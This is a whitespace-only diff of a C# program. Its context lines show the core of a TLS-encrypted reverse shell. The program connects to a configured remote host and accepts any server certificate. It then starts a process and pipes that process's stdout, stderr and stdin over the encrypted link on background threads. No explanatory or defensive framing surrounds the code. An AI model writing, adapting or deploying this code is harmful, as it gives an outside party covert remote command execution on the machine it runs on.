@@ -17,16 +17,16 @@ class Program
     {
         try
         {
-            
+
             using (var client = new TcpClient(RemoteHost, RemotePort))
-            
+
             using (var ssl = new SslStream(
                 client.GetStream(),
                 leaveInnerStreamOpen: false,
                 userCertificateValidationCallback: (_,__,___,____) => true
             ))
             {
-                
+
                 ssl.AuthenticateAsClient(
                     targetHost: RemoteHost,
                     clientCertificates: null,
@@ -49,7 +49,7 @@ class Program
                 };
                 p.Start();
 
-                
+
                 var tOut = new Thread(() => CopyStream(p.StandardOutput.BaseStream, ssl)) { IsBackground = true };
                 var tErr = new Thread(() => CopyStream(p.StandardError .BaseStream, ssl)) { IsBackground = true };
                 var tIn  = new Thread(() => CopyStream(ssl,               p.StandardInput.BaseStream)) { IsBackground = true };
